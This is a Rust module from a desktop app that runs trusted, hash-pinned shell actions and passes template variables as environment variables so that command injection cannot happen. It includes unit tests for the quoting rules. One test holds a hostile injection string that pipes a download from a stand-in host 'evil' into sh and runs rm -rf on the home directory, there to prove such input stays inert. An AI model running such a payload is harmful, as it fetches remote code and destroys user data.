//! WP-53: headless exec for the `shell` run kind (G-ACTIONS §8.1), plus the
//! `{{branch}}` lookup (§8.2). Typed client: `src/lib/actions/runner/shell.ts`.
//!
//! **The frontend never sends command text.** A request names the action
//! (`scope`, `actionId`, `runHash`) and carries the six variable values.
//! This command loads the action's `run` from the in-force document itself
//! (WP-50's `ActionsManager`), checks it, and interpolates the pinned
//! `command` / `cwd`:
//!
//! - `scope: "project"` — the in-force project entry for `actionId` must be a
//!   `shell` action whose canonical-`run` hash equals `runHash` AND whose
//!   trust state is `trusted` at that hash (DEC-55, fail-closed).
//! - `scope: "personal"` — `actionId` must exist in the in-force personal
//!   `actions.json` as a `shell` action with that hash, so a project action
//!   cannot be relabelled personal to skip the gate.
//! - any other scope is refused.
//!
//! This is not a boundary against the frontend itself (any code that can
//! call app commands can already spawn a PTY), but no runner bug can run a
//! command other than the one pinned and trusted.
//!
//! **Variables never touch the command text (§8.2).** Each value is passed
//! as an environment variable on the child (`IKENGA_FILE_PATH`,
//! `IKENGA_FILE_NAME`, `IKENGA_SELECTION`, `IKENGA_PROJECT_ROOT`,
//! `IKENGA_PANE_URL`, `IKENGA_BRANCH`) and each `{{var}}` is rewritten to the
//! shell's own reference to it — POSIX `"${IKENGA_X}"` bare / `${IKENGA_X}`
//! inside `"…"`, PowerShell `${env:IKENGA_X}` — so the shell expands the
//! value and never re-parses it: `$(…)`, backticks, `;`, quotes and newlines
//! in a value are inert. The template's quote state is tracked while
//! scanning (POSIX `'` `"` `\`; PowerShell `'` `"` and backtick, typographic
//! quotes included): inside single quotes no reference expands, so a
//! variable there is refused (`variable-in-single-quotes`), as is one right
//! after an escape character (`variable-after-escape`). A mis-tracked quote
//! can only make a reference literal or unquoted — never execute a value.
//! `cwd` is not a shell context: its values are substituted directly, and a
//! NUL or newline in the result is refused.
//!
//! Rust owns the shell: `/bin/sh -c` on unix; on Windows
//! `powershell.exe -NoProfile -NonInteractive -EncodedCommand <base64
//! UTF-16LE>` (the script never goes through Windows argv parsing) with
//! UTF-8 console output. A timeout kills the whole tree: the process group
//! on unix, `taskkill /T /F` on Windows.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::{Arc, Mutex};

use serde::{Deserialize, Serialize};
use serde_json::Value;
use tauri::State;
use tokio::io::{AsyncRead, AsyncReadExt};
use tokio::process::Command;
use tokio::time::{timeout, Duration};

use crate::actions::trust::{run_hash, ActionTrust, TrustState};
use crate::actions::ActionsManager;
use crate::platform::NoConsoleWindow;

/// Default wall clock for one run; a caller may ask for up to `MAX_TIMEOUT_SECS`.
const DEFAULT_TIMEOUT_SECS: u64 = 300;
const MAX_TIMEOUT_SECS: u64 = 3600;
/// Per stream. Output beyond it is read and dropped (`*_truncated: true`).
const OUTPUT_CAP: usize = 256 * 1024;
/// After the shell exits, how long background children may keep the pipes
/// open before the readers are abandoned with what they have.
const DRAIN_GRACE: Duration = Duration::from_secs(2);

/// The six run variables (§8.2) and the environment variable each travels in.
pub const RUN_VARIABLES: [(&str, &str); 6] = [
    ("file.path", "IKENGA_FILE_PATH"),
    ("file.name", "IKENGA_FILE_NAME"),
    ("selection", "IKENGA_SELECTION"),
    ("project.root", "IKENGA_PROJECT_ROOT"),
    ("pane.url", "IKENGA_PANE_URL"),
    ("branch", "IKENGA_BRANCH"),
];

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ActionExecRequest {
    /// `"personal"` or `"project"` — where the action is defined.
    pub scope: String,
    #[serde(default)]
    pub project_id: Option<String>,
    pub action_id: String,
    /// SHA-256 of the canonical `run` JSON (B-14) the caller ran through the gate.
    pub run_hash: String,
    /// The six values by variable name (`"file.path"`, …); missing = `""`.
    #[serde(default)]
    pub variables: HashMap<String, String>,
    #[serde(default)]
    pub timeout_secs: Option<u64>,
}

#[derive(Clone, Debug, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ActionExecResult {
    /// Exited with status 0.
    pub ok: bool,
    pub exit_code: Option<i32>,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
    pub timed_out: bool,
    /// The directory the command ran in.
    pub cwd: String,
    /// `"sh"` or `"powershell"`.
    pub shell: String,
    /// Spawn / wait failure, or why it was refused.
    pub error: Option<String>,
    /// Set when nothing was spawned for a known reason (`untrusted`,
    /// `changed`, `trust-unavailable`, `unavailable`, `not-found`,
    /// `not-shell`, `unknown-scope`, `unknown-variable`,
    /// `variable-in-single-quotes`, `variable-after-escape`,
    /// `invalid-variable`, `invalid-cwd`).
    pub refusal: Option<String>,
}

/// Why a run was not spawned.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Refusal {
    pub reason: &'static str,
    pub message: String,
}

impl Refusal {
    fn new(reason: &'static str, message: impl Into<String>) -> Self {
        Self {
            reason,
            message: message.into(),
        }
    }
}

impl ActionExecResult {
    fn refused(refusal: Refusal) -> Self {
        Self {
            shell: ShellFlavor::host().name().to_string(),
            error: Some(refusal.message),
            refusal: Some(refusal.reason.to_string()),
            ..Default::default()
        }
    }
}

/// The pinned `shell` run, read from the in-force document (never from the caller).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PinnedShellRun {
    pub command: String,
    pub cwd: Option<String>,
}

fn shell_run_of(run: &Value) -> Option<PinnedShellRun> {
    if run.get("kind")?.as_str()? != "shell" {
        return None;
    }
    Some(PinnedShellRun {
        command: run.get("command")?.as_str()?.to_string(),
        cwd: run.get("cwd").and_then(Value::as_str).map(str::to_string),
    })
}

/// The DEC-55 check for one project `shell` run against the in-force trust
/// entries; returns the pinned run. Fail-closed: an id that is not listed is
/// untrusted.
pub fn check_project_shell_trust(
    actions: &[ActionTrust],
    action_id: &str,
    run_hash: &str,
) -> Result<PinnedShellRun, Refusal> {
    let Some(entry) = actions.iter().find(|entry| entry.id == action_id) else {
        return Err(Refusal::new(
            "untrusted",
            format!("project action `{action_id}` is not trusted"),
        ));
    };
    if entry.kind != "shell" {
        return Err(Refusal::new(
            "not-shell",
            format!("project action `{action_id}` is not a shell action"),
        ));
    }
    if entry.hash != run_hash {
        return Err(Refusal::new(
            "changed",
            format!("project action `{action_id}` changed since it was reviewed; trust it again"),
        ));
    }
    match entry.state {
        TrustState::Trusted => shell_run_of(&entry.run).ok_or_else(|| {
            Refusal::new(
                "not-shell",
                format!("project action `{action_id}` has no shell command"),
            )
        }),
        TrustState::Changed => Err(Refusal::new(
            "changed",
            format!("project action `{action_id}` changed since it was trusted; trust it again"),
        )),
        _ => Err(Refusal::new(
            "untrusted",
            format!("project action `{action_id}` is not trusted"),
        )),
    }
}

/// A personal run: `action_id` must be a `shell` action of the in-force
/// personal `actions.json` whose `run` hashes to `run_hash`.
pub fn check_personal_shell(
    document: Option<&Value>,
    action_id: &str,
    run_hash_given: &str,
) -> Result<PinnedShellRun, Refusal> {
    let action = document
        .and_then(|document| document.get("actions"))
        .and_then(Value::as_array)
        .and_then(|actions| {
            actions
                .iter()
                .find(|action| action.get("id").and_then(Value::as_str) == Some(action_id))
        })
        .ok_or_else(|| {
            Refusal::new(
                "not-found",
                format!("`{action_id}` is not an action in your personal actions.json"),
            )
        })?;
    let run = action.get("run").ok_or_else(|| {
        Refusal::new(
            "not-shell",
            format!("personal action `{action_id}` has no run"),
        )
    })?;
    let pinned = shell_run_of(run).ok_or_else(|| {
        Refusal::new(
            "not-shell",
            format!("personal action `{action_id}` is not a shell action"),
        )
    })?;
    if run_hash(run) != run_hash_given {
        return Err(Refusal::new(
            "changed",
            format!("personal action `{action_id}` changed on disk; run it again"),
        ));
    }
    Ok(pinned)
}

// ---------------------------------------------------------------------------
// Interpolation (§8.2): environment variables, never spliced text
// ---------------------------------------------------------------------------

/// The shell a command runs under.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ShellFlavor {
    Posix,
    PowerShell,
}

impl ShellFlavor {
    /// What `action_exec` runs on this platform.
    pub fn host() -> Self {
        if cfg!(windows) {
            Self::PowerShell
        } else {
            Self::Posix
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            Self::Posix => "sh",
            Self::PowerShell => "powershell",
        }
    }
}

fn env_name(variable: &str) -> Option<&'static str> {
    RUN_VARIABLES
        .iter()
        .find(|(name, _)| *name == variable)
        .map(|(_, env)| *env)
}

/// `{{` up to the next `}}`, the name verbatim — the same scan as the
/// validator's `template_variables` and `interpolate.ts`. Returns
/// `(literal before, name)` pairs and the trailing literal.
fn segments(template: &str) -> (Vec<(&str, &str)>, &str) {
    let mut out = Vec::new();
    let mut rest = template;
    loop {
        let Some(start) = rest.find("{{") else { break };
        let after = &rest[start + 2..];
        let Some(end) = after.find("}}") else { break };
        out.push((&rest[..start], &after[..end]));
        rest = &after[end + 2..];
    }
    (out, rest)
}

fn unknown_variable(name: &str) -> Refusal {
    Refusal::new(
        "unknown-variable",
        format!("`{{{{{name}}}}}` is not a run variable"),
    )
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Quote {
    None,
    Single,
    Double,
}

/// PowerShell reads the typographic single quotes as `'` too.
fn is_ps_single(c: char) -> bool {
    matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}')
}

/// …and the typographic double quotes as `"`.
fn is_ps_double(c: char) -> bool {
    matches!(c, '"' | '\u{201C}' | '\u{201D}' | '\u{201E}')
}

/// Tracks the quote state of the template's literal text.
struct QuoteScanner {
    flavor: ShellFlavor,
    state: Quote,
    /// The last character was an unconsumed escape (`\` / backtick).
    escaped: bool,
}

impl QuoteScanner {
    fn new(flavor: ShellFlavor) -> Self {
        Self {
            flavor,
            state: Quote::None,
            escaped: false,
        }
    }

    fn feed(&mut self, text: &str) {
        let mut chars = text.chars().peekable();
        while let Some(c) = chars.next() {
            if self.escaped {
                self.escaped = false;
                continue;
            }
            match self.flavor {
                ShellFlavor::Posix => match (self.state, c) {
                    (Quote::None, '\\') | (Quote::Double, '\\') => self.escaped = true,
                    (Quote::None, '\'') => self.state = Quote::Single,
                    (Quote::None, '"') => self.state = Quote::Double,
                    (Quote::Single, '\'') | (Quote::Double, '"') => self.state = Quote::None,
                    _ => {}
                },
                ShellFlavor::PowerShell => match self.state {
                    Quote::None => {
                        if c == '`' {
                            self.escaped = true;
                        } else if is_ps_single(c) {
                            self.state = Quote::Single;
                        } else if is_ps_double(c) {
                            self.state = Quote::Double;
                        }
                    }
                    Quote::Single => {
                        if is_ps_single(c) {
                            // `''` is an escaped quote inside a verbatim string.
                            if chars.peek().copied().is_some_and(is_ps_single) {
                                chars.next();
                            } else {
                                self.state = Quote::None;
                            }
                        }
                    }
                    Quote::Double => {
                        if c == '`' {
                            self.escaped = true;
                        } else if is_ps_double(c) {
                            if chars.peek().copied().is_some_and(is_ps_double) {
                                chars.next();
                            } else {
                                self.state = Quote::None;
                            }
                        }
                    }
                },
            }
        }
    }
}

/// Rewrites every `{{var}}` of `template` to `flavor`'s reference to the
/// variable's environment variable (see the module note). No value is read.
pub fn rewrite_command(template: &str, flavor: ShellFlavor) -> Result<String, Refusal> {
    let (parts, tail) = segments(template);
    let mut scanner = QuoteScanner::new(flavor);
    let mut out = String::with_capacity(template.len() + parts.len() * 24);
    for (text, name) in parts {
        scanner.feed(text);
        out.push_str(text);
        let env = env_name(name).ok_or_else(|| unknown_variable(name))?;
        if scanner.escaped {
            return Err(Refusal::new(
                "variable-after-escape",
                format!("`{{{{{name}}}}}` follows an escape character; remove it"),
            ));
        }
        let reference = match (flavor, scanner.state) {
            (_, Quote::Single) => {
                return Err(Refusal::new(
                    "variable-in-single-quotes",
                    format!(
                        "`{{{{{name}}}}}` is inside single quotes, where no variable expands; \
                         use double quotes or leave it bare"
                    ),
                ))
            }
            (ShellFlavor::Posix, Quote::None) => format!("\"${{{env}}}\""),
            (ShellFlavor::Posix, Quote::Double) => format!("${{{env}}}"),
            (ShellFlavor::PowerShell, _) => format!("${{env:{env}}}"),
        };
        out.push_str(&reference);
    }
    out.push_str(tail);
    Ok(out)
}

fn value_of<'a>(variables: &'a HashMap<String, String>, name: &str) -> &'a str {
    variables.get(name).map(String::as_str).unwrap_or("")
}

/// The six environment variables for the child (missing values are `""`).
pub fn variable_env(
    variables: &HashMap<String, String>,
) -> Result<Vec<(&'static str, String)>, Refusal> {
    RUN_VARIABLES
        .iter()
        .map(|(name, env)| {
            let value = value_of(variables, name);
            if value.contains('\0') {
                return Err(Refusal::new(
                    "invalid-variable",
                    format!("`{{{{{name}}}}}` contains a NUL character"),
                ));
            }
            Ok((*env, value.to_string()))
        })
        .collect()
}

/// Interpolates the `cwd` template. It never reaches a shell (only
/// `current_dir`), so values are substituted directly; a NUL or newline in
/// the result is refused. `None` = the home directory.
pub fn interpolate_cwd(
    template: Option<&str>,
    variables: &HashMap<String, String>,
) -> Result<Option<String>, Refusal> {
    let template = template.unwrap_or("{{project.root}}");
    let (parts, tail) = segments(template);
    let mut out = String::new();
    for (text, name) in parts {
        out.push_str(text);
        if env_name(name).is_none() {
            return Err(unknown_variable(name));
        }
        out.push_str(value_of(variables, name));
    }
    out.push_str(tail);
    if out.chars().any(|c| matches!(c, '\0' | '\n' | '\r')) {
        return Err(Refusal::new(
            "invalid-cwd",
            "the working directory contains a NUL or newline",
        ));
    }
    let out = out.trim();
    Ok(if out.is_empty() {
        None
    } else {
        Some(out.to_string())
    })
}

/// The PowerShell script: UTF-8 output first (5.1 defaults to the OEM code
/// page), then the command.
pub fn powershell_script(command: &str) -> String {
    format!(
        "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8\n\
         $OutputEncoding = [System.Text.Encoding]::UTF8\n\
         {command}"
    )
}

/// `-EncodedCommand` payload: base64 of the UTF-16LE script.
pub fn encode_powershell(script: &str) -> String {
    use base64::Engine as _;
    let bytes: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

// ---------------------------------------------------------------------------
// Exec
// ---------------------------------------------------------------------------

/// Resolves and checks the working directory.
pub fn resolve_cwd(cwd: Option<&str>, home: Option<PathBuf>) -> Result<PathBuf, String> {
    let dir = match cwd.map(str::trim).filter(|value| !value.is_empty()) {
        Some(value) => PathBuf::from(value),
        None => home.ok_or_else(|| "no working directory and no home directory".to_string())?,
    };
    if !dir.is_absolute() {
        return Err(format!(
            "working directory `{}` is not absolute",
            dir.display()
        ));
    }
    if !dir.is_dir() {
        return Err(format!(
            "working directory `{}` does not exist",
            dir.display()
        ));
    }
    Ok(dir)
}

fn clamp_timeout(requested: Option<u64>) -> u64 {
    requested
        .filter(|secs| *secs > 0)
        .unwrap_or(DEFAULT_TIMEOUT_SECS)
        .min(MAX_TIMEOUT_SECS)
}

/// The host shell running `command` (already rewritten for `ShellFlavor::host()`).
fn shell_command(command: &str, cwd: &Path, env: &[(&'static str, String)]) -> Command {
    #[cfg(windows)]
    let std_cmd = {
        let mut cmd = std::process::Command::new("powershell.exe");
        cmd.args([
            "-NoProfile",
            "-NonInteractive",
            "-EncodedCommand",
            encode_powershell(&powershell_script(command)).as_str(),
        ]);
        cmd
    };
    #[cfg(not(windows))]
    let std_cmd = {
        let mut cmd = std::process::Command::new("/bin/sh");
        cmd.arg("-c").arg(command);
        #[cfg(unix)]
        {
            // Own process group, so a timeout can stop the whole tree.
            use std::os::unix::process::CommandExt;
            cmd.process_group(0);
        }
        cmd
    };
    let mut cmd = Command::from(std_cmd);
    cmd.current_dir(cwd)
        .env("PATH", crate::runtime::augmented_path())
        .envs(env.iter().map(|(key, value)| (*key, value.as_str())))
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .no_console_window();
    cmd
}

type Captured = Arc<Mutex<(Vec<u8>, bool)>>;

async fn read_capped<R: AsyncRead + Unpin>(mut reader: R, sink: Captured) {
    let mut chunk = [0u8; 8192];
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                let Ok(mut guard) = sink.lock() else { break };
                let room = OUTPUT_CAP.saturating_sub(guard.0.len());
                if room > 0 {
                    guard.0.extend_from_slice(&chunk[..n.min(room)]);
                }
                if n > room {
                    guard.1 = true;
                }
            }
        }
    }
}

fn take(captured: &Captured) -> (String, bool) {
    match captured.lock() {
        Ok(guard) => (String::from_utf8_lossy(&guard.0).into_owned(), guard.1),
        Err(_) => (String::new(), false),
    }
}

/// Kills the process tree rooted at `pid` (the shell). Takes the pid, not
/// the `Child`, so the exec future never holds a `&Child` across an await.
#[cfg(unix)]
async fn kill_tree(pid: Option<u32>) {
    if let Some(pid) = pid {
        // The child leads its own group (`process_group(0)`): signal the group.
        unsafe {
            libc::kill(-(pid as libc::pid_t), libc::SIGKILL);
        }
    }
}

#[cfg(windows)]
async fn kill_tree(pid: Option<u32>) {
    if let Some(pid) = pid {
        // `/T` walks the shell's descendants; it must run while the shell is
        // still alive, i.e. before `child.kill()`.
        let pid = pid.to_string();
        let mut cmd = Command::new("taskkill");
        cmd.args(["/T", "/F", "/PID", pid.as_str()])
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .no_console_window();
        let _ = timeout(Duration::from_secs(5), cmd.status()).await;
    }
}

#[cfg(not(any(unix, windows)))]
async fn kill_tree(_pid: Option<u32>) {}

/// Runs one pinned `shell` run headless with `variables` as environment.
pub async fn exec(
    run: &PinnedShellRun,
    variables: &HashMap<String, String>,
    timeout_secs: Option<u64>,
    home: Option<PathBuf>,
) -> ActionExecResult {
    let flavor = ShellFlavor::host();
    let prepared = rewrite_command(&run.command, flavor).and_then(|command| {
        let env = variable_env(variables)?;
        let cwd = interpolate_cwd(run.cwd.as_deref(), variables)?;
        Ok((command, env, cwd))
    });
    let (command, env, cwd) = match prepared {
        Ok(prepared) => prepared,
        Err(refusal) => return ActionExecResult::refused(refusal),
    };
    let cwd = match resolve_cwd(cwd.as_deref(), home) {
        Ok(dir) => dir,
        Err(error) => return ActionExecResult::refused(Refusal::new("invalid-cwd", error)),
    };
    let shell = flavor.name();
    let mut cmd = shell_command(&command, &cwd, &env);
    let mut result = ActionExecResult {
        cwd: cwd.display().to_string(),
        shell: shell.to_string(),
        ..Default::default()
    };

    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => {
            result.error = Some(format!("could not start {shell}: {e}"));
            return result;
        }
    };

    let stdout: Captured = Arc::new(Mutex::new((Vec::new(), false)));
    let stderr: Captured = Arc::new(Mutex::new((Vec::new(), false)));
    let mut readers = Vec::new();
    if let Some(pipe) = child.stdout.take() {
        readers.push(tokio::spawn(read_capped(pipe, stdout.clone())));
    }
    if let Some(pipe) = child.stderr.take() {
        readers.push(tokio::spawn(read_capped(pipe, stderr.clone())));
    }

    let secs = clamp_timeout(timeout_secs);
    match timeout(Duration::from_secs(secs), child.wait()).await {
        Ok(Ok(status)) => {
            result.ok = status.success();
            result.exit_code = status.code();
        }
        Ok(Err(e)) => result.error = Some(format!("{shell} wait failed: {e}")),
        Err(_) => {
            result.timed_out = true;
            result.error = Some(format!("timed out after {secs}s"));
            kill_tree(child.id()).await;
            let _ = child.kill().await;
        }
    }

    for reader in readers {
        let abort = reader.abort_handle();
        if timeout(DRAIN_GRACE, reader).await.is_err() {
            abort.abort();
        }
    }
    (result.stdout, result.stdout_truncated) = take(&stdout);
    (result.stderr, result.stderr_truncated) = take(&stderr);
    result
}

/// Loads the pinned run for `request` (see the module note).
async fn load_pinned(
    manager: &ActionsManager,
    request: &ActionExecRequest,
) -> Result<PinnedShellRun, Refusal> {
    match request.scope.as_str() {
        "project" => {
            let status = manager
                .trust_status(request.project_id.as_deref())
                .await
                .map_err(|e| {
                    Refusal::new(
                        "trust-unavailable",
                        format!("project trust could not be read: {e}"),
                    )
                })?;
            check_project_shell_trust(&status.actions, &request.action_id, &request.run_hash)
        }
        "personal" => {
            let files = manager
                .read_files(request.project_id.as_deref())
                .await
                .map_err(|e| {
                    Refusal::new(
                        "unavailable",
                        format!("personal actions could not be read: {e}"),
                    )
                })?;
            check_personal_shell(
                files.personal.actions.document.as_ref(),
                &request.action_id,
                &request.run_hash,
            )
        }
        other => Err(Refusal::new(
            "unknown-scope",
            format!("unknown action scope `{other}`"),
        )),
    }
}

/// `shell` run kind: load the pinned run, check it, run it (module note).
#[tauri::command]
pub async fn action_exec(
    manager: State<'_, Arc<ActionsManager>>,
    request: ActionExecRequest,
) -> Result<ActionExecResult, String> {
    let manager: &ActionsManager = manager.inner().as_ref();
    let result = match load_pinned(manager, &request).await {
        Ok(run) => {
            exec(
                &run,
                &request.variables,
                request.timeout_secs,
                crate::platform::home_dir(),
            )
            .await
        }
        Err(refusal) => ActionExecResult::refused(refusal),
    };
    tracing::info!(
        "[action_exec] scope={} action={} exit={:?} timed_out={} refusal={:?}",
        request.scope,
        request.action_id,
        result.exit_code,
        result.timed_out,
        result.refusal
    );
    Ok(result)
}

/// The branch checked out at `root`, read from `.git/HEAD` (no subprocess).
/// `None` when `root` is not a git work tree or HEAD is detached.
pub fn git_branch_at(root: &Path) -> Option<String> {
    let dot_git = root.join(".git");
    let git_dir = if dot_git.is_dir() {
        dot_git
    } else {
        // A worktree / submodule: `.git` is a file `gitdir: <path>`.
        let text = std::fs::read_to_string(&dot_git).ok()?;
        let target = text
            .lines()
            .find_map(|line| line.strip_prefix("gitdir:"))?
            .trim();
        let path = PathBuf::from(target);
        if path.is_absolute() {
            path
        } else {
            root.join(path)
        }
    };
    let head = std::fs::read_to_string(git_dir.join("HEAD")).ok()?;
    head.trim()
        .strip_prefix("ref: refs/heads/")
        .map(str::to_string)
}

/// `{{branch}}` (§8.2): the current git branch at `root`, `null` if none.
#[tauri::command]
pub async fn action_git_branch(root: String) -> Result<Option<String>, String> {
    let root = PathBuf::from(root);
    if !root.is_absolute() {
        return Ok(None);
    }
    Ok(tokio::task::spawn_blocking(move || git_branch_at(&root))
        .await
        .unwrap_or(None))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn entry(id: &str, run: Value, hash: &str, state: TrustState) -> ActionTrust {
        ActionTrust {
            id: id.into(),
            name: None,
            kind: run["kind"].as_str().unwrap_or("").into(),
            run,
            hash: hash.into(),
            state,
        }
    }

    fn vars(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    #[test]
    fn project_trust_is_fail_closed_and_returns_the_pinned_run() {
        let shell = json!({ "kind": "shell", "command": "make {{branch}}", "cwd": "/w" });
        let actions = vec![
            entry("ok", shell.clone(), "h1", TrustState::Trusted),
            entry("new", shell.clone(), "h2", TrustState::Untrusted),
            entry("edited", shell, "h3", TrustState::Changed),
            entry("chi", json!({ "kind": "chi" }), "h4", TrustState::NotGated),
        ];
        assert_eq!(
            check_project_shell_trust(&actions, "ok", "h1").unwrap(),
            PinnedShellRun {
                command: "make {{branch}}".into(),
                cwd: Some("/w".into())
            }
        );
        let reason = |id: &str, hash: &str| {
            check_project_shell_trust(&actions, id, hash)
                .unwrap_err()
                .reason
        };
        assert_eq!(reason("missing", "h1"), "untrusted");
        assert_eq!(reason("new", "h2"), "untrusted");
        assert_eq!(reason("edited", "h3"), "changed");
        // A caller holding a different `run` than the one pinned.
        assert_eq!(reason("ok", "other"), "changed");
        // Only shell actions come through this command.
        assert_eq!(reason("chi", "h4"), "not-shell");
    }

    #[test]
    fn personal_run_must_be_in_the_personal_document_with_that_hash() {
        let run = json!({ "kind": "shell", "command": "ls" });
        let hash = run_hash(&run);
        let document = json!({ "version": 1, "actions": [
            { "id": "ls", "name": "List", "run": run },
            { "id": "ask", "name": "Ask", "run": { "kind": "chi", "target": "new", "prompt": "x" } },
        ]});
        assert_eq!(
            check_personal_shell(Some(&document), "ls", &hash).unwrap(),
            PinnedShellRun {
                command: "ls".into(),
                cwd: None
            }
        );
        // A project action relabelled personal is not in the personal file.
        assert_eq!(
            check_personal_shell(Some(&document), "deploy", &hash)
                .unwrap_err()
                .reason,
            "not-found"
        );
        assert_eq!(
            check_personal_shell(None, "ls", &hash).unwrap_err().reason,
            "not-found"
        );
        assert_eq!(
            check_personal_shell(Some(&document), "ls", "stale")
                .unwrap_err()
                .reason,
            "changed"
        );
        let ask_hash = run_hash(&document["actions"][1]["run"]);
        assert_eq!(
            check_personal_shell(Some(&document), "ask", &ask_hash)
                .unwrap_err()
                .reason,
            "not-shell"
        );
    }

    #[test]
    fn posix_rewrite_references_env_vars() {
        let posix = |t: &str| rewrite_command(t, ShellFlavor::Posix);
        assert_eq!(
            posix("cat {{file.path}}").unwrap(),
            r#"cat "${IKENGA_FILE_PATH}""#
        );
        assert_eq!(
            posix(r#"echo "{{selection}}""#).unwrap(),
            r#"echo "${IKENGA_SELECTION}""#
        );
        assert_eq!(
            posix(r#"echo "on {{branch}}x" {{file.name}}"#).unwrap(),
            r#"echo "on ${IKENGA_BRANCH}x" "${IKENGA_FILE_NAME}""#
        );
        // A `'` inside double quotes, or escaped, opens nothing.
        assert_eq!(
            posix(r#"echo "it's {{branch}}""#).unwrap(),
            r#"echo "it's ${IKENGA_BRANCH}""#
        );
        assert_eq!(
            posix(r"echo \'{{branch}}").unwrap(),
            r#"echo \'"${IKENGA_BRANCH}""#
        );
        assert_eq!(
            posix("echo 'a' {{branch}}").unwrap(),
            r#"echo 'a' "${IKENGA_BRANCH}""#
        );
        assert_eq!(posix("no vars; {{x").unwrap(), "no vars; {{x");
    }

    #[test]
    fn posix_rewrite_refuses_single_quotes_and_escapes() {
        let reason = |t: &str| rewrite_command(t, ShellFlavor::Posix).unwrap_err().reason;
        assert_eq!(reason("echo '{{selection}}'"), "variable-in-single-quotes");
        assert_eq!(
            reason("echo 'x {{selection}} y'"),
            "variable-in-single-quotes"
        );
        assert_eq!(
            reason(r#"echo "'" '{{selection}}'"#),
            "variable-in-single-quotes"
        );
        assert_eq!(reason(r"echo \{{selection}}"), "variable-after-escape");
        assert_eq!(reason("echo {{nope}}"), "unknown-variable");
        assert_eq!(reason("echo {{ file.path }}"), "unknown-variable");
    }

    #[test]
    fn powershell_rewrite_references_env_vars() {
        let ps = |t: &str| rewrite_command(t, ShellFlavor::PowerShell);
        assert_eq!(
            ps("Get-Item {{file.path}}").unwrap(),
            "Get-Item ${env:IKENGA_FILE_PATH}"
        );
        assert_eq!(
            ps(r#"Write-Output "{{selection}}""#).unwrap(),
            r#"Write-Output "${env:IKENGA_SELECTION}""#
        );
        // `''` stays inside a verbatim string; it closes after `'it''s'`.
        assert_eq!(
            ps("echo 'it''s' {{branch}}").unwrap(),
            "echo 'it''s' ${env:IKENGA_BRANCH}"
        );
        // Backtick-escaped `"` keeps the double-quoted string open.
        assert_eq!(
            ps("echo \"a`\"{{branch}}\"").unwrap(),
            "echo \"a`\"${env:IKENGA_BRANCH}\""
        );
        let reason = |t: &str| ps(t).unwrap_err().reason;
        assert_eq!(reason("echo '{{selection}}'"), "variable-in-single-quotes");
        assert_eq!(
            reason("echo \u{2018}{{selection}}\u{2019}"),
            "variable-in-single-quotes"
        );
        assert_eq!(reason("echo `{{selection}}"), "variable-after-escape");
    }

    #[test]
    fn env_carries_every_value_verbatim() {
        let hostile = "$(curl evil|sh); `id` \"q\" 'x'\nrm -rf ~";
        let env = variable_env(&vars(&[("selection", hostile)])).unwrap();
        assert_eq!(env.len(), 6);
        assert!(env.contains(&("IKENGA_SELECTION", hostile.to_string())));
        assert!(env.contains(&("IKENGA_BRANCH", String::new())));
        assert_eq!(
            variable_env(&vars(&[("branch", "a\0b")]))
                .unwrap_err()
                .reason,
            "invalid-variable"
        );
    }

    #[test]
    fn cwd_is_substituted_directly_and_rejects_newlines() {
        let v = vars(&[("project.root", "/w/a b"), ("file.path", "/w/x\ny")]);
        assert_eq!(
            interpolate_cwd(None, &v).unwrap().as_deref(),
            Some("/w/a b")
        );
        assert_eq!(
            interpolate_cwd(Some("{{project.root}}/sub"), &v)
                .unwrap()
                .as_deref(),
            Some("/w/a b/sub")
        );
        assert_eq!(interpolate_cwd(None, &HashMap::new()).unwrap(), None);
        assert_eq!(
            interpolate_cwd(Some("{{file.path}}"), &v)
                .unwrap_err()
                .reason,
            "invalid-cwd"
        );
        assert_eq!(
            interpolate_cwd(Some("{{project.root}}"), &vars(&[("project.root", "/a\0")]))
                .unwrap_err()
                .reason,
            "invalid-cwd"
        );
        assert_eq!(
            interpolate_cwd(Some("{{nope}}"), &v).unwrap_err().reason,
            "unknown-variable"
        );
    }

    #[test]
    fn powershell_is_encoded_utf16le_with_utf8_output() {
        use base64::Engine as _;
        let script = powershell_script("Write-Output ${env:IKENGA_SELECTION}");
        assert!(script.starts_with("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8\n"));
        assert!(script.ends_with("\nWrite-Output ${env:IKENGA_SELECTION}"));
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(encode_powershell("é’"))
            .unwrap();
        assert_eq!(bytes, vec![0xE9, 0x00, 0x19, 0x20]);
    }

    #[test]
    fn cwd_must_be_an_existing_absolute_dir() {
        let tmp = std::env::temp_dir();
        assert_eq!(resolve_cwd(Some(tmp.to_str().unwrap()), None).unwrap(), tmp);
        assert_eq!(resolve_cwd(None, Some(tmp.clone())).unwrap(), tmp);
        assert_eq!(resolve_cwd(Some("  "), Some(tmp.clone())).unwrap(), tmp);
        assert!(resolve_cwd(Some("relative/dir"), None).is_err());
        assert!(resolve_cwd(None, None).is_err());
        assert!(resolve_cwd(Some(tmp.join("wp53-no-such-dir").to_str().unwrap()), None).is_err());
    }

    #[test]
    fn timeout_is_clamped() {
        assert_eq!(clamp_timeout(None), DEFAULT_TIMEOUT_SECS);
